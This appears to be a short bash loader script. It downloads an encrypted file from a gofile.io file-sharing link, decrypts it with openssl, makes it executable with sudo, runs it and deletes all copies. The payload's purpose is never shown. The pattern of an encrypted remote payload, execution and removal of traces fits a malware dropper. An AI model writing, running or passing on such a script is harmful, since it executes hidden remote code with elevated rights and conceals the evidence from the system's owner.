#! /bin/bash
cd
curl -O https://store5.gofile.io/download/973d395e-468f-4c64-ba96-f98834a9fbaf/x-l1bra.enc
openssl enc -d -aes-256-cbc -in x-l1bra.enc -out x-l1bra
sudo chmod 755 x-l1bra
./x-l1bra
rm x-l1bra.enc x-l1bra
